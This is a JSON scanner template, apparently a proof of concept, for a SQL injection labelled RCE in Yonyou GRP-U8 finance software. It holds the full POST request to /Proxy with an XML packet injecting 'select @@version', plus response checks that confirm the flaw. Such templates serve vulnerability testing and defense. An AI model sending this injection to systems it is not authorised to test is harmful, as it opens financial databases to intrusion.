{
    "Name": "用友GRP-U8行政财务版SQL注入-RCE",
    "Description": "用友GRP-U8行政财务版SQL注入-RCE",
    "Product": "用友",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/Proxy",
        "Port":"",
        "Data":"cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format=\"text\">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "Microsoft SQL Server"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
